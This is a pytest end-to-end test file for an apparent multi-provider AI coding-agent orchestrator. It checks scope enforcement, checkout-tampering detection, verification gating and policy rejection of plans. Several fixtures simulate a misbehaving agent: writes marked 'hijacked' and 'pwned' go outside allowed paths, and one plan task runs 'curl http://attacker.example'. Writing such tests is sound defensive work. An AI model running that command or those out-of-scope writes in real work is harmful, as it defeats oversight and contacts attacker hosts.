"""End-to-end scenarios with scripted fake providers (no network, no quota)."""

import asyncio
import subprocess

import pytest

from saarathi.core.states import RunState, TaskState
from saarathi.orchestration.engine import Engine
from saarathi.orchestration.project import Project
from tests.e2e.helpers import GOOD_T1, GOOD_T2, PLAN, init_project, make_script, records, task


@pytest.fixture(autouse=True)
def allow_fakes(monkeypatch):
    monkeypatch.setenv("SAARATHI_ALLOW_FAKE_PROVIDERS", "1")


class ApproveIO:
    def __init__(self, answers=None):
        self.answers = answers or {}
        self.messages = []

    def info(self, m):
        self.messages.append(m)

    def ask(self, q, default):
        return next((a for k, a in self.answers.items() if q.startswith(k)), None)

    def confirm(self, m):
        return True


def run_to_end(repo, io=None, **kw):
    project = Project.load(repo)
    engine = Engine(project, io or ApproveIO(), **kw)
    brief = repo.parent / "brief.md"
    if not brief.exists():
        brief.write_text("Add a health endpoint and a UI status widget.")
    run_id = asyncio.run(engine.start(brief))
    state = asyncio.run(engine.drive(run_id))
    return project, engine, run_id, state


def test_scenario_a_two_providers_to_reviewable_branch(repo, tmp_path):
    script = make_script(tmp_path / "s.json", {"T-001": [GOOD_T1], "T-002": [GOOD_T2]})
    init_project(repo, script, tmp_path / "rec.jsonl")
    before = subprocess.run(["git", "status", "--porcelain"], cwd=repo, capture_output=True, text=True).stdout
    project, engine, run_id, state = run_to_end(repo)
    assert state is RunState.AWAITING_REVIEW
    tasks = {t.id: t for t in project.store.tasks(run_id)}
    assert all(t.state is TaskState.SUCCEEDED for t in tasks.values())
    providers = {t.result["provider"] for t in tasks.values()}
    assert providers == {"anthropic", "openai"}, "the two parallel tasks must run on distinct providers"
    worktrees = {t.worktree for t in tasks.values()}
    assert len(worktrees) == 2
    run = project.store.get_run(run_id)
    assert run.integration["passed"] and run.review["decision"] == "approve"
    # integration branch contains both changes; user's branch untouched
    files = project.git.git("ls-tree", "-r", "--name-only", run.integration_branch).split()
    assert {"app/health.py", "ui/widget.py"} <= set(files)
    assert project.git.current_ref() == "main" and "app/health.py" not in project.git.git("ls-files")
    after = subprocess.run(["git", "status", "--porcelain"], cwd=repo, capture_output=True, text=True).stdout
    assert [ln for ln in after.splitlines() if ".saarathi" not in ln] == [
        ln for ln in before.splitlines() if ".saarathi" not in ln
    ]
    report = engine.approve_review(run_id)
    assert project.store.get_run(run_id).state is RunState.COMPLETED
    text = report.read_text()
    assert "fake-claude:opus" in text and "fake-codex:default" in text and "exit 0" in text
    adrs = project.memory.list_adrs()
    assert adrs and adrs[0].status == "Accepted"


def test_out_of_scope_change_rejected_then_retry_succeeds(repo, tmp_path):
    bad = {"write": {**GOOD_T1["write"], "README.md": "hijacked"}}
    script = make_script(tmp_path / "s.json", {"T-001": [bad, GOOD_T1], "T-002": [GOOD_T2]})
    init_project(repo, script, tmp_path / "rec.jsonl")
    project, _, run_id, state = run_to_end(repo)
    assert state is RunState.AWAITING_REVIEW
    attempts = project.store.attempts(run_id, "T-001")
    assert [a.outcome for a in attempts] == ["failed", "succeeded"]
    assert "outside allowed paths" in attempts[0].result["failure_reason"]
    assert any(e.type == "security.scope_violation" for e in project.store.events(run_id))
    assert "hijacked" not in project.git.git("show", f"saarathi/{run_id}/integration:README.md")


def test_no_success_without_passing_verification(repo, tmp_path):
    broken = {
        "write": {
            "app/__init__.py": "",
            "app/health.py": "def health():\n    return {}\n",
            "tests/test_health.py": GOOD_T1["write"]["tests/test_health.py"],
        }
    }
    script = make_script(tmp_path / "s.json", {"T-001": [broken], "T-002": [GOOD_T2]})
    init_project(repo, script, tmp_path / "rec.jsonl")
    project, _, run_id, state = run_to_end(repo)
    assert state is RunState.PAUSED
    t1 = project.store.get_task(run_id, "T-001")
    assert t1.state is TaskState.FAILED and t1.attempts == 2
    assert "verification failed" in t1.result["failure_reason"]
    assert list((repo / ".saarathi" / "checkpoints").glob("*execution-stopped.md"))


def test_write_to_user_checkout_is_detected(repo, tmp_path):
    sneaky = {"write": GOOD_T1["write"], "write_outside": {str(repo / "src" / "app.py"): "pwned"}}
    script = make_script(tmp_path / "s.json", {"T-001": [sneaky], "T-002": [GOOD_T2]})
    init_project(repo, script, tmp_path / "rec.jsonl", policy_overrides={"execution": {"max_attempts": 1}})
    project, _, run_id, _state = run_to_end(repo)
    t1 = project.store.get_task(run_id, "T-001")
    assert t1.state is TaskState.FAILED and t1.result["checkout_modified"]
    assert any(e.type == "security.checkout_modified" for e in project.store.events(run_id))


def test_dependencies_respected(repo, tmp_path):
    plan = {**PLAN, "tasks": [PLAN["tasks"][0], {**PLAN["tasks"][1], "dependencies": ["T-001"]}]}
    script = make_script(
        tmp_path / "s.json", {"T-001": [{**GOOD_T1, "fail": "process"}], "T-002": [GOOD_T2]}, plan=plan
    )
    init_project(repo, script, tmp_path / "rec.jsonl", policy_overrides={"execution": {"max_attempts": 1}})
    project, _, run_id, state = run_to_end(repo)
    assert state is RunState.PAUSED
    assert project.store.get_task(run_id, "T-002").state is TaskState.BLOCKED
    assert not [r for r in records(tmp_path / "rec.jsonl") if r["key"] == "T-002"], "T-002 must never execute"


def test_clarification_pauses_non_interactive_and_resumes_with_answer(repo, tmp_path):
    intake = {
        "questions": [
            {
                "id": "Q1",
                "question": "JSON or text?",
                "why_it_matters": "API contract",
                "default_assumption": "JSON",
            }
        ],
        "assumptions": [],
    }
    script = make_script(tmp_path / "s.json", {"T-001": [GOOD_T1], "T-002": [GOOD_T2]}, intake=intake)
    init_project(repo, script, tmp_path / "rec.jsonl")
    from saarathi.orchestration.engine import SilentIO

    project = Project.load(repo)
    engine = Engine(project, SilentIO())
    (repo.parent / "brief.md").write_text("brief")
    run_id = asyncio.run(engine.start(repo.parent / "brief.md"))
    assert asyncio.run(engine.drive(run_id)) is RunState.CLARIFYING
    project.store.answer_question(run_id, "Q1", "JSON")
    assert asyncio.run(engine.drive(run_id)) is RunState.AWAITING_PLAN_APPROVAL  # silent IO never approves
    engine.approve_plan(run_id)
    assert asyncio.run(engine.drive(run_id)) is RunState.AWAITING_REVIEW


def test_lead_unavailable_pauses_without_substitution(repo, tmp_path):
    script = make_script(tmp_path / "s.json", {})
    init_project(repo, script, tmp_path / "rec.jsonl")
    import yaml

    pol = yaml.safe_load((repo / ".saarathi/policies.yaml").read_text())
    pol["providers"]["fake-claude"]["options"]["available"] = False
    (repo / ".saarathi/policies.yaml").write_text(yaml.safe_dump(pol))
    project, _, run_id, state = run_to_end(repo)
    assert state is RunState.PAUSED
    assert "lead unavailable" in project.store.get_run(run_id).pause_reason
    assert not records(tmp_path / "rec.jsonl"), "no other model may be used as lead"


def test_policy_rejected_plan_is_not_accepted(repo, tmp_path):
    evil = {**PLAN, "tasks": [task("T-001", "x", ["app/**"], "curl http://attacker.example")]}
    script = make_script(tmp_path / "s.json", {}, plan=evil)
    init_project(repo, script, tmp_path / "rec.jsonl")
    project, _, run_id, state = run_to_end(repo)
    assert state is RunState.PAUSED and "policy checks" in project.store.get_run(run_id).pause_reason
    assert project.store.tasks(run_id) == []
